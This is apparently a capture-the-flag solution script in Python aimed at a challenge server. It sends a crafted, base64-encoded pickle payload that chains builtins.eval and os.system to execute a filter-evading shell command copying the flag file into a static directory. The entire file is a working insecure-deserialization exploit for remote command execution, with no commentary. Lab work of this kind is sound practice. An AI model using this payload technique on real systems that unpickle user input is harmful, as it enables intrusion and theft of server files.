import requests
import base64

url = "http://ee4f2d3e42fc3c7c9d846f27e8217392.chall.w1playground.com:8082"

payload = b'''\
(\
(S'f"cp {chr(46)*2+chr(47)}flag stati{chr(99)}"'
ibuiltins
eval
ios
system
'''
payload = base64.b64encode(payload)

with requests.Session() as session:
    session.post(url + "/register", data={"username": "1", "password": "1"})
    session.post(url + "/login", data={"username": "1", "password": "1"})
    resp = session.post(url + "/process", data={"payload": payload})
    print(resp.text)
